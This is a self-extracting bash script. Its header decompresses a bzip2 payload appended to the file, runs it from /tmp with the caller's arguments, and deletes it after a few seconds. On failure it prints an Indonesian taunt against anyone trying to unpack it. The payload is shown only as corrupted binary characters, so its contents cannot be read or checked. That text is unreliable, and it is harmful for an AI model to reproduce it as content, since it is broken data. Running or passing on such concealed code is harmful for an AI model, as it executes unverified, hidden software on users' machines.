#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY���� b_�D}� @����P;�B�	h0   A� �   ���h  ɠ 4� "T����SC�@@dJ4���"O�L��P��F��	�G">3 RE��INC"y���{l�U�/Qn���E����5u�h~�<����k�)JR��+JǬc:�$3HA�GpxS&�<��Y$�����>�K�����pI��LtO	�)�@ݻj��7���Nb�8�
:	PJ4m��wp���V 5̝��hJ�=�(; �@�^=����-��"5@{����	=�mQ�"f���L���	��������I,HM�Ȃ!!"�iW[����(lI��@�I�a����z���$�0I��$�h����b���1J^�����Z�b%v�u��P���6���$zjB�o	�,�}	��}��K;��(�):��5�!hL7���a*2��+�$�K	6���[Ax&c�`iR|��|kR�ǣ ��
)0�DI�3���T�5%��挒"u�J�D6��G�̂љM9DA*�D���r\�E2HD*�h�F0FP-�[.�m��m��'`mP/jT=h��b#�H0ha���T�L[�hr'JI<��B�S�9�����)��}�